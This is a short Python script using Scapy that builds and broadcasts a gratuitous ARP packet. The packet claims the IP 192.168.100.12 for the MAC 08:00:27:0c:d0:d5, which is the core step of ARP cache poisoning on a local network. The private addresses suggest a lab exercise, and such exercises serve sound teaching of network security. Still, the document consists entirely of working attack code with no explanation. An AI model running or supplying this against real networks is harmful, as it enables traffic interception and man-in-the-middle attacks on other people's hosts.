#!/usr/bin/env python3
from scapy.all import *
E = Ether(dst='ff:ff:ff:ff:ff:ff', src='08:00:27:0c:d0:d5')
A = ARP(hwsrc='08:00:27:0c:d0:d5', psrc='192.168.100.12', hwdst='ff:ff:ff:ff:ff:ff', pdst='192.168.100.12')
pkt = E/A
pkt.show()
sendp(pkt)